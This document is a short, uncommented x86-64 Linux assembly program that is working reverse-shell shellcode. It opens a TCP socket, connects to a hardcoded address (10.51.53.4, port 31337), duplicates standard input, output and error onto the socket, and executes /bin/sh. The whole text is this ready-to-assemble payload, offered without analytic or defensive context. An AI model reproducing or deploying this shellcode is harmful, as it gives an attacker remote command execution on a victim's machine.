global _start
section .text

_start:
xor    rax,rax
xor    rdi,rdi
xor    rsi,rsi
xor    rdx,rdx
xor    r8,r8
push   0x2
pop    rdi
push   0x1
pop    rsi
push   0x6
pop    rdx
push   0x29
pop    rax
syscall 
mov    r8,rax
xor    rsi,rsi
xor    r10,r10
push   r10
mov    BYTE [rsp],0x2
mov    WORD [rsp+0x2],0x697a
mov    DWORD [rsp+0x4],0x435330a
mov    rsi,rsp
push   0x10
pop    rdx
push   r8
pop    rdi
push   0x2a
pop    rax
syscall 
xor    rsi,rsi
push   0x3
pop    rsi
doop:
dec    rsi
push   0x21
pop    rax
syscall 
jne    doop
xor    rdi,rdi
push   rdi
push   rdi
pop    rsi
pop    rdx
mov rdi,0x68732f6e69622f2f
shr    rdi,0x8
push   rdi
push   rsp
pop    rdi
push   0x3b
pop    rax
syscall